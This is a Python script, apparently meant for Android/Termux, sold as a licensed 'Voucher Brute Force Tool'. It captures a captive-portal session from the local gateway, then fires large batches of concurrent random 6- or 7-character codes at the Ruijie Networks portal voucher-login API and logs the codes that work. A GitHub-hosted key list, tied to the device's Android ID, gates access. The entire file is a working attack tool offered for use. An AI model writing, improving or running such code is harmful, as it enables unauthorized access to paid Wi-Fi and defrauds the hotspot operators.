#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import time
import json
import base64
import random
import string
import hashlib
import requests
import aiohttp
import asyncio
import argparse
from datetime import datetime, date
from urllib.parse import quote, urlparse, parse_qs, urljoin

# ==========================================
# 0. GITHUB LICENSE SYSTEM (EXP SUPPORTED)
# ==========================================

# GitHub Link (သင်ပေးထားသော link အသစ်)
SHEET_CSV_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key"

LICENSE_STORAGE = os.path.expanduser("~/.ruijie_license.json")
KEY_STORAGE_FILE = os.path.expanduser("~/.ruijie_device_key.txt")

def get_stable_device_id():
    if os.path.exists(KEY_STORAGE_FILE):
        try:
            with open(KEY_STORAGE_FILE, 'r') as f:
                saved_key = f.read().strip()
                if saved_key:
                    return saved_key
        except:
            pass
    
    try:
        import subprocess
        android_id = subprocess.check_output("settings get secure android_id", shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if android_id and len(android_id) > 5:
            stable_key = hashlib.md5(f"STABLE_{android_id}".encode()).hexdigest()[:16]
        else:
            import uuid
            install_path = os.path.dirname(os.path.abspath(__file__))
            stable_key = hashlib.md5(f"{install_path}{uuid.getnode()}".encode()).hexdigest()[:16]
    except:
        stable_key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    
    try:
        with open(KEY_STORAGE_FILE, 'w') as f:
            f.write(stable_key)
    except:
        pass
    
    return stable_key

async def check_license():
    """GitHub ကနေ Device ID နဲ့ Exp ကို စစ်ဆေးပေးမည့် Function"""
    sys_key = get_stable_device_id()
    print(f"[*] Device ID: {sys_key}")
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(SHEET_CSV_URL, timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    lines = content.strip().split('\n')
                    today = date.today()

                    for line in lines:
                        line = line.strip()
                        if '|' in line:
                            stored_key, exp_date_str = line.split('|')
                            
                            if sys_key == stored_key.strip():
                                try:
                                    exp_date = datetime.strptime(exp_date_str.strip(), "%Y-%m-%d").date()
                                    if today <= exp_date:
                                        print(f"{g}[✓] License ACTIVE (Expires: {exp_date}){w}")
                                        return True
                                    else:
                                        print(f"{r}[✗] License EXPIRED on {exp_date}{w}")
                                        return False
                                except ValueError:
                                    continue
                    
                    print(f"{r}[✗] License INVALID: Key not found on server.{w}")
                    return False
                else:
                    print(f"{r}[!] Server Error: Status {response.status}{w}")
                    return False
    except Exception as e:
        print(f"{r}[!] Connection Error: {e}{w}")
        return False

# ==========================================
# COLORS & LOGO (W T F VERSION)
# ==========================================

def clear():
    os.system("clear")

w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"

def Line():
    print(f"{y}-{w}"*os.get_terminal_size()[0])

def Logo():
    clear()
    logo = f"""{r}
 __      __  _______  ______ 
/  \    /  ||       ||   ___|
\   \/\/   |   |   | |   ___|
 \__/\__/    |___|   |__|    
                             
{g}           Voucher Brute Force Tool{w}
{g}     「 GitHub License System (v2.0) 」{w}"""
    print(logo)
    Line()
    print(f"{w}[*] Developer: Moe Yu")
    print(f"{w}[*] License  : GitHub Managed (Exp Support)")
    Line()

# ==========================================
# VOUCHER BRUTE FORCE FUNCTIONS
# ==========================================

async def get_session_id(session, session_url, previous_session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Mobile Safari/537.36',
    }
    try:
        async with session.get(session_url, headers=headers) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response).group(1)
            return session_id
    except:
        return previous_session_id

async def login_voucher(session, session_id, voucher, file=None, debug=False):
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Mobile Safari/537.36",
    }
    try:
        async with session.post(post_url, json=data, headers=headers) as req:
            response = await req.text()
            if 'logonUrl' in response:
                print(f'{g}Success: {voucher}{w}')
                with open("success.txt", "a") as f: f.write(voucher+"\n")
            elif debug:
                print(f'{r}Failed: {voucher}{w}')
            if file:
                with open(file, "a") as f: f.write(voucher+"\n")
    except:
        pass

def ascii_generator(mode, length):
    if mode == "ascii-lower": chars = string.ascii_lowercase
    elif mode == "ascii-upper": chars = string.ascii_uppercase
    elif mode == "ascii-mix": chars = string.ascii_letters
    else: chars = string.digits
    return "".join(random.choice(chars) for _ in range(length))

class VoucherCode:
    def __init__(self, mode, length, speed, tasks, debug):
        self.mode, self.length, self.speed, self.tasks, self.debug = mode, length, speed, tasks, debug
        self.file = f"failed_{mode}_{length}.txt"
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except:
            print(f"{r}[!] Session url not found. Run --setup first.{w}")
            sys.exit()

    async def execute(self):
        Logo()
        print(f"[*] Bruteforce mode: {self.mode} | Length: {self.length}")
        print(f"[*] Speed: {self.speed} | Tasks: {self.tasks}")
        Line()
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.speed)) as session:
            tasks = []
            loop = 0
            while True:
                if loop % 90 == 0:
                    session_id = await get_session_id(session, self.session_url, None)
                voucher = ascii_generator(self.mode, self.length)
                tasks.append(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                if len(tasks) >= self.tasks:
                    await asyncio.gather(*tasks)
                    tasks = []
                loop += 1

def setup():
    Logo()
    print(f"{g}[+] Setup Mode - Capturing Session...{w}")
    try:
        req_res = requests.get("http://192.168.0.1", timeout=10).url
        session_url = "https://portal-as.ruijienetworks.com" + re.search(r"href='(.*?)'</script>", requests.get(req_res).text).group(1)
        with open(".session_url", "w") as f: f.write(session_url)
        print(f"{g}[✓] Setup completed successfully!{w}")
    except Exception as err:
        print(f"{r}[✗] Setup failed: {err}{w}")

# ==========================================
# MAIN EXECUTION
# ==========================================

async def main():
    if len(sys.argv) > 1:
        if sys.argv[1] == "--key":
            print(f"\n{g}Device ID: {get_stable_device_id()}{w}")
            sys.exit(0)
        elif sys.argv[1] == "--setup":
            setup()
            sys.exit(0)
        elif sys.argv[1] == "--reset":
            for f in [LICENSE_STORAGE, KEY_STORAGE_FILE, ".session_url"]:
                if os.path.exists(f): os.remove(f)
            print(f"{g}[✓] Cache cleared.{w}")
            sys.exit(0)

    Logo()
    if not await check_license():
        print(f"{y}[!] Use --key to get ID and add it to GitHub.{w}")
        sys.exit(1)

    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["code", "setup"], default="code")
    parser.add_argument("-m", "--mode", choices=["digit", "ascii-lower", "ascii-upper", "ascii-mix"], default="digit")
    parser.add_argument("-l", "--length", choices=[6, 7], type=int, default=6)
    parser.add_argument("-s", "--speed", type=int, default=100)
    parser.add_argument("-t", "--tasks", type=int, default=100)
    parser.add_argument("-d", "--debug", action="store_true")
    args = parser.parse_args()

    if args.option == "setup":
        setup()
    else:
        v = VoucherCode(args.mode, args.length, args.speed, args.tasks, args.debug)
        await v.execute()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{y}[!] Stopped by user.{w}")
